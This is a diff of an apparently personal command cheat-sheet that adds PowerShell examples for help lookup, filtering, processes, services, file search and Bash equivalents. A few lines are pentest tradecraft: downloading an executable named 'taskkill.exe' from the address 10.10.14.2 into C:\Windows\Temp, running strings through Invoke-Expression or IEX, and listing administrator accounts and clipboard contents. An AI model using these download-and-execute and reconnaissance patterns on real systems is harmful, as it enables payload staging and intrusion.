@@ -1251,11 +1251,6 @@ $ lspci - PCI device discovery
 
 
 
-Powershell
-==========
-
-https://docs.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7.1
-
 Windows Kernel
 ==============
 https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/attaching-to-a-virtual-machine--kernel-mode-
@@ -1306,4 +1301,124 @@ sc.exe delete filter
 WinDbg (windbg)
 ---------------
 dd [location/variable] - dissassembly data at variable
+
+
+Powershell
+==========
+
+https://docs.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7.1
+https://resources.infosecinstitute.com/topic/powershell-for-pentesters-part-1-introduction-to-powershell-and-cmdlets/
+
+Examples
+--------
+```bash
+Try fuzzy find some command:
+get-help *alia*
+Get-Command *alia*
+
+get-help get-service -examples
+Get-Service | Where-Object {$_.Status -eq "Running"}
+ls | Get-Member -MemberType * | Select-Object MemberType
+Print processes - name and id
+foreach($proc in Get-Process) { $name = $proc.ProcessName; $id = $proc.Id; echo "$name $id" }
+Display each process's name
+Get-Process | ForEach-Object ProcessName
+
+Invoke-Expression - runs command from string:
+Invoke-Expression "echo HI"
+IEX "echo HI"
+echo 'iex "echo HI"' | powershell -noprofile -
+
+Filtering result:
+https://www.concurrency.com/blog/august-2018/powershell-basics-filtering-and-selecting
+Get-Process | Where-Object {$_.WorkingSet -gt 100000000}
+Get-Command *schedule* | ? {$_.Name -like "Get*"}
+Get-ChildItem | Select-Object -First 5
+Get-Process | Select-Object -Property Name, Id
+
+Find out all the property list for object:
+Get-Service | Format-List *
+
+Get the threads of a given process
+(Get-Process -Name vim).Threads
+(Get-Process -Name vim).Threads | ForEach-Object { $_.ThreadState }
+foreach($proc in (Get-Process -Name "chrome")) { $id=$proc.Id; echo "#### $id ######"; $proc.Threads|ForEach-Object Id }
+Finding certain files: 
+Get-ChildItem -Path C:\ -Include *.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.LastWriteTime -ge $FindDate }
+Get-ChildItem -Path C:\ -Filter *.doc -File -ErrorAction SilentlyContinue | Where-Object { $_.LastWriteTime -ge $FindDate }
+
+% means Foreach-Object:
+Get-ChildItem | % { echo $_.name }
+
+Write many variables:
+Get-ChildItem | % { Write-Host $_.Length $_.Name -Separator "`t" }
+
+Where-Object: to filter out the objects coming from the pipeline ( ? is the alias)
+get-ChildItem| ? {$_.length –gt 10000000 | % {write-host $_.length $_.name -separator "`t`t"}
+
+Filtering(?) and Foreach-ing(%):
+Get-ChildItem | ? { $_.Length -le 18 } | % { write-host $_.Length $_.Name -Separator "`t`t" }
+
+Show all the members of the object
+Get-ChildItem .\MsMpEng.exe | Select-Object *
+
+Use a hashmap to count number of distinct verb commands we have
+$counts=@{}; foreach($verb in (Get-Command | % Verb)) { $counts[$verb]+=1 }; $counts.GetEnumerator() | Sort-Object -Property Value -Descending
+
+Downloading from web:
+(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
+$res = (New-Object Net.WebClient).DownloadString("https://index.hu")
+Invoke-WebRequest "https://index.hu/" -OutFile .\Downloads\index.html
+
+List admin accounts:
+Get-LocalGroupMember Administrators
+
+Clipboard access:
+Get-Clipboard
+
+Processes:
+Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
+
+Services:
+Get-Service
+Get-Service | ? Status -like Running
+
+Network interfaces:
+Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
+Get-DnsClientServerAddress -AddressFamily IPv4 | ft
+
+```
+
+
+Bash -> Powershell
+==================
+
+```bash
+
+echo:
+write-output
+write-host
+
+find . -name "poti*" -type f
+Get-ChildItem -Path . -Filter "poti*" -Recurse -File 
+
+which
+function which($name)                                            
+{                                                                
+    Get-Command $name | Select-Object -ExpandProperty Definition 
+}                                                                
+
+rm -rf <folder>
+Remove-Item –path <folder> –recurse
+
+unalias <aliasname>
+Remove-Item Alias:<aliasname>
+Remove-Item Function:<functionname>
+
+cd $TMP
+cd $env:TMP
+
+```
+
+
 
